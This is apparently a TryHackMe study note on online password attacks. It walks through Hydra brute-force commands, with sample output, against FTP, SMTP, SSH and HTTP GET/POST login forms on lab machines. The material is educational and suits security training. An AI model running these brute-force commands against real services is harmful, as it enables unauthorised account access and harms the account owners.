---
title: Online Password Attacks 🏯
tags:
  - TryHackMe
  - Theory
---
Online password attacks involve guessing passwords for networked services that use a username and password authentication scheme, including services such as HTTP, SSH, VNC, FTP, SNMP, POP3, etc. This section showcases using hydra which is a common tool used in attacking logins for various network services.  

## Hydra

Hydra supports an extensive list of network services to attack. Using hydra, we'll brute-force network services such as web login pages, FTP, SMTP, and SSH in this section. Often, within hydra, each service has its own options and the syntax hydra expects takes getting used to. It's important to check the help options for more information and features.  

## FTP  

In the following scenario, we will perform a brute-force attack against an FTP server. By checking the hydra help options, we know the syntax of attacking the FTP server is as follows:

````shell           
user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
````

`-l ftp` we are specifying a single username, use `-L` for a username wordlist

`-P Path` specifying the full path of wordlist, you can specify a single password by using `-p` 

`ftp://10.10.x.x` the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

Remember that sometimes you don't need to brute-force and could first try default credentials. Try to attack the FTP server on the attached VM and answer the question below.

## SMTP  

Similar to FTP servers, we can also brute-force SMTP servers using hydra. The syntax is similar to the previous example. The only difference is the targeted protocol. Keep in mind, if you want to try other online password attack tools, you may need to specify the port number, which is 25. Make sure to read the help options of the tool.

````shell           
user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
````

## SSH  

SSH brute-forcing can be common if your server is accessible to the Internet. Hydra supports many protocols, including SSH. We can use the previous syntax to perform our attack! It's important to notice that password attacks rely on having an excellent wordlist to increase your chances of finding a valid username and password.

````shell           
user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.10.x.x:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
[INFO] Successful, password authentication is supported by ssh://10.10.x.x:22
[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
````

## HTTP login pages

In this scenario, we will brute-force HTTP login pages. To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST. Checking hydra options: `hydra http-get-form -U`, we can see that hydra has the following syntax for the http-get-form option:

`<url>:<form parameters>:<condition string>[:<optional>[:<optional>]`

As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite.

````shell           
user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task 
[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php 
[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx 
1 of 1 target successfully completed, 1 valid password found 
Hydra (http://www.thc.org/thc-hydra) 
finished at 2021-10-13 08:06:45
````

`-l admin`  we are specifying a single username, use `-L` for a username wordlist

`-P Path` specifying the full path of wordlist, you can specify a single password by using -p.

`10.10.x.x` the IP address or the fully qualified domain name (FQDN) of the target.

`http-get-form` the type of HTTP request, which can be either `http-get-form` or `http-post-form`

Next, we specify the URL, path, and conditions that are split using `:`

`login-get/index.php` the path of the login page on the target webserver.

`username=^USER^&password=^PASS^` the parameters to brute-force, we inject `^USER^` to brute force usernames and `^PASS^` for passwords from the specified dictionary.

The following section is important to eliminate false positives by specifying the 'failed' condition with p`F=`.

And success conditions, `S=`. You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage 'Invalid password' after a failed login, set `F=Invalid Password`.

Or for example, during the enumeration, we found that the webserver serves `logout.php`. After logging into the login page with valid credentials, we could guess that we will have logout.php somewhere on the page. Therefore, we could tell hydra to look for the text `logout.php` within the HTML for every request.

`S=logout.php` the success condition to identify the valid credentials

`-f` to stop the brute-forcing attacks after finding a valid username and password

You can try it out on the attached VM by visiting `http://10.10.188.205/login-get/index.php`. Make sure to deploy the attached VM if you haven't already to answer the questions below.

Finally, it is worth it to check other online password attacks tools to expand your knowledge, such as:  

- `Medusa`
- `Ncrack`
- `others!`

*NOTE: Simple Mail Transfer Protocol (SMTP) is a protocol used to send the email to an SMTP server, more specifically to a Mail Submission Agent (MSA) or a Mail Transfer Agent (MTA).*

*NOTE: to make an **hydra** password crack to a post form: `hydra -l burgess -P burgess.txt 10.10.188.205 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f -I`*

